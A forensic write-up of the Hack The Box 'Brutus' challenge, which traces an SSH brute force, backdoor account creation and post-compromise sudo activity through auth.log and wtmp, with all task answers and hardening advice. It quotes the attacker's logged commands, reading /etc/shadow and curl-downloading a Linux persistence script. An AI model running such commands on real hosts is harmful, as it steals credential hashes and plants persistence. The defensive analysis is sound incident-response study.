# HTB Sherlock — “Brutus” (DFIR)

**Category:** DFIR / Sherlock  
**Difficulty:** Very Easy

---

## Scenario

> A Confluence server was brute-forced through its SSH service. After gaining access, the attacker carried out additional activity that can be tracked in `auth.log`, including privilege escalation, persistence, and even some visibility into command execution.

Three artifacts are provided in `Brutus.zip`:

```text
auth.log   Unix authentication log (text)
wtmp       Binary login/logout records
utmp.py    Python parser for utmp/wtmp structures
```

---

## Tooling

- `grep`, `sort`, `uniq` — to filter and aggregate `auth.log`
- `utmp.py` (provided) — to parse the binary `wtmp` file
- MITRE ATT&CK — to map the observed behaviour to techniques

---

## Recon: Two Artifacts, Two Perspectives

Each artifact answers a different question, and the investigation relies on correlating them.

|  | `auth.log` | `wtmp` |
|---|---|---|
| Format | Plain text | Binary (384-byte `utmp` records) |
| Records | Authentication events, `sudo`, account changes | Terminal logins/logouts, reboots |
| Reading | `grep` / `cat` | `utmp.py`, or `last -f wtmp` |

A typical `auth.log` line looks like this:

```text
Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Invalid user admin from 65.2.161.68 port 46380
└── timestamp ──┘ └── hostname ──┘ └ process ┘ └──────────────── message ────────────────┘
```

Two details to keep in mind:

- `auth.log` has **no year**. The `wtmp` file provides it (2024).
- `utmp.py` converts epoch values with `time.localtime()`, so the output depends on the analyst’s timezone. Since the questions ask for UTC, run it as:

```bash
TZ=UTC python3 utmp.py wtmp
```

The log also contains noise: a legitimate `root` login from `203.101.190.9` (session 6) at 06:19:54. It is not related to the attack.

---

## Task 1 — Brute-force source IP

A brute force against SSH leaves a recognisable signature: many failures in a short time, from one IP, with a **different source port for each attempt** (each try opens a new TCP connection), and several attempts within the same second, which points to automated tooling.

```bash
grep "Failed password" auth.log | grep -oE "from [0-9.]+" | sort | uniq -c | sort -rn
```

| Line type | IP | Count |
|---|---|---|
| `Failed password` | 65.2.161.68 | 48 |
| `Invalid user` | 65.2.161.68 | 34 |

**Answer:** `65.2.161.68`

---

## Task 2 — Compromised account

A successful login is logged as `Accepted password`. Filtering on the attacker’s IP:

```bash
grep "Accepted" auth.log | grep "65.2.161.68"
```

```text
06:31:40  Accepted password for root         from 65.2.161.68 port 34782
06:32:44  Accepted password for root         from 65.2.161.68 port 53184
06:37:34  Accepted password for cyberjunkie  from 65.2.161.68 port 43260
```

The brute force succeeded against `root`. The `cyberjunkie` login comes later and is the backdoor account (Task 5).

**Answer:** `root`

---

## Task 3 — Interactive login time (wtmp)

The first `root` login at 06:31:40 has **no matching entry in `wtmp`**. No terminal was opened, which suggests the attacker only validated the password. The second login at 06:32:44 does appear in `wtmp`:

```text
USER  pid=2549  pts/1  root         65.2.161.68  2024/03/06 06:32:45
DEAD  pid=2491  pts/1  (session end)              2024/03/06 06:37:24
USER  pid=2667  pts/1  cyberjunkie  65.2.161.68  2024/03/06 06:37:35
```

The authentication time (`auth.log`) and the terminal-establishment time (`wtmp`) differ by one second. The question asks for the latter.

**Answer:** `2024-03-06 06:32:45`

---

## Task 4 — Session number

`systemd-logind` assigns a number to every login session:

```bash
grep -n "New session" auth.log
```

| Session | Time | User / Source | Meaning |
|---|---|---|---|
| 6 | 06:19:54 | root / 203.101.190.9 | Legitimate admin (noise) |
| 34 | 06:31:40 | root / 65.2.161.68 | Password validation, no shell |
| **37** | 06:32:44 | root / 65.2.161.68 | **Interactive attacker session** |
| 49 | 06:37:34 | cyberjunkie / 65.2.161.68 | Backdoor account |

The `sshd` PID (2491) ties session 37 to the `DEAD` record in `wtmp`.

**Answer:** `37`

---

## Task 5 — Persistence: new privileged account

Account creation and group changes are logged by the system tools themselves:

```bash
grep -E "useradd|usermod|gpasswd|groupadd|new user" auth.log
```

| Time | Process | Action |
|---|---|---|
| 06:34:18 | `groupadd` | Group `cyberjunkie` created (GID 1002) |
| 06:34:18 | `useradd` | User `cyberjunkie` created (UID 1002, `/bin/bash`, `from=/dev/pts/1`) |
| 06:34:26 | `passwd` | Password set |
| 06:34:31 | `chfn` | Account information changed |
| 06:35:15 | `usermod` | `cyberjunkie` added to group `sudo` |

`from=/dev/pts/1` matches the `pts/1` terminal seen in `wtmp`, which confirms the account was created from the attacker’s root session. Membership of `sudo` gives root-equivalent rights on Debian/Ubuntu, so the account survives even if the attacker loses direct access to `root`.

**Answer:** `cyberjunkie`

---

## Task 6 — MITRE ATT&CK sub-technique

The tactic is **Persistence**. The parent technique is **T1136 — Create Account**, split by where the account lives:

| ID | Name | Scope |
|---|---|---|
| T1136.001 | Local Account | Created on the host (`useradd`, `/etc/passwd`) |
| T1136.002 | Domain Account | Active Directory |
| T1136.003 | Cloud Account | Cloud provider identity |

The account was created locally with `useradd`.

**Answer:** `T1136.001`

---

## Task 7 — End of the attacker’s first SSH session

The session is identified by its `sshd` PID (2491) and its logind number (37):

```bash
grep -nE "Session 37|sshd\[2491\]" auth.log
```

```text
06:32:44  Accepted password for root from 65.2.161.68 port 53184
06:37:24  Received disconnect from 65.2.161.68 port 53184:11: disconnected by user
06:37:24  pam_unix(sshd:session): session closed for user root
06:37:24  systemd-logind: Session 37 logged out. Waiting for processes to exit.
```

The session lasted about 4 min 40 s. The attacker disconnected voluntarily, then logged back in as `cyberjunkie` ten seconds later (06:37:34) to test the backdoor. The `wtmp` `DEAD` record (06:37:24) agrees with `auth.log`.

**Answer:** `2024-03-06 06:37:24`

---

## Task 8 — Command run with sudo

`sudo` logs every command with its full arguments in the `COMMAND=` field:

```bash
grep "COMMAND" auth.log
```

```text
06:37:57  cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
06:39:38  cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

The attacker first dumped `/etc/shadow` (password hashes), then used `curl` as root to download `linper.sh` from the public *linper* GitHub repository, a Linux persistence tool. Note that `auth.log` only records that the command was launched. It does not show what was done with the downloaded script.

**Answer:** `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`

---

## Attack Timeline (UTC, 2024-03-06)

| Time | Event |
|---|---|
| 06:31:31 | Brute force starts from `65.2.161.68` (`Invalid user admin`, `Failed password`) |
| 06:31:40 | First successful `root` login (session 34, no terminal) |
| 06:32:44 | Second `root` login, interactive shell (session 37, wtmp 06:32:45) |
| 06:34:18 | Account `cyberjunkie` created |
| 06:35:15 | `cyberjunkie` added to the `sudo` group |
| 06:37:24 | Root session 37 ends |
| 06:37:34 | Login as `cyberjunkie` (session 49) |
| 06:37:57 | `sudo cat /etc/shadow` |
| 06:39:38 | `sudo curl` downloads `linper.sh` |

---

## Mapping to MITRE ATT&CK

| Observed behaviour | Technique |
|---|---|
| SSH brute force | T1110 — Brute Force |
| Login as `root` / `cyberjunkie` | T1078.003 — Valid Accounts: Local Accounts |
| `useradd` | T1136.001 — Create Account: Local Account |
| Added to `sudo` group | T1098 — Account Manipulation |
| `sudo cat /etc/shadow` | T1003.008 — OS Credential Dumping: /etc/passwd and /etc/shadow |
| `sudo curl` of `linper.sh` | T1105 — Ingress Tool Transfer |

---

## Final Answers

| Task | Answer |
|---|---|
| 1 | `65.2.161.68` |
| 2 | `root` |
| 3 | `2024-03-06 06:32:45` |
| 4 | `37` |
| 5 | `cyberjunkie` |
| 6 | `T1136.001` |
| 7 | `2024-03-06 06:37:24` |
| 8 | `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh` |

---

## Takeaways

- A brute force is easy to spot: one source IP, many `Failed password` / `Invalid user` lines, and a new source port on every attempt. Counting by IP is usually enough to identify it.
- `Accepted password` does not mean the attacker had a shell. Correlating `auth.log` with `wtmp` separates a simple password check (session 34) from a real interactive session (session 37).
- Identifiers link the artifacts together: the `sshd` PID, the logind session number, and the `pts/N` terminal appear across `auth.log` and `wtmp`.
- Always convert timestamps to the timezone the question expects. `utmp.py` uses the local timezone, so set `TZ=UTC`.
- Account creation leaves several traces (`groupadd`, `useradd`, `passwd`, `chfn`, `usermod`), which makes persistence through new accounts straightforward to reconstruct.
- `sudo` logs full command lines, which gives direct visibility into post-compromise activity.
- Defensive takeaways: disable password authentication for SSH and forbid direct `root` login, use key-based authentication, add rate limiting or `fail2ban`, and alert on new accounts and changes to the `sudo` group.

---

## References

- Hack The Box — Sherlock “Brutus”: https://app.hackthebox.com/sherlocks/Brutus
- `utmp(5)` manual page: https://man7.org/linux/man-pages/man5/utmp.5.html
- MITRE ATT&CK T1136.001 — Create Account: Local Account: https://attack.mitre.org/techniques/T1136/001/
- MITRE ATT&CK T1110 — Brute Force: https://attack.mitre.org/techniques/T1110/
- MITRE ATT&CK T1078.003 — Valid Accounts: Local Accounts: https://attack.mitre.org/techniques/T1078/003/
- MITRE ATT&CK T1098 — Account Manipulation: https://attack.mitre.org/techniques/T1098/
- MITRE ATT&CK T1003.008 — /etc/passwd and /etc/shadow: https://attack.mitre.org/techniques/T1003/008/
- MITRE ATT&CK T1105 — Ingress Tool Transfer: https://attack.mitre.org/techniques/T1105/
- linper (Linux persistence tool): https://github.com/montysecurity/linper
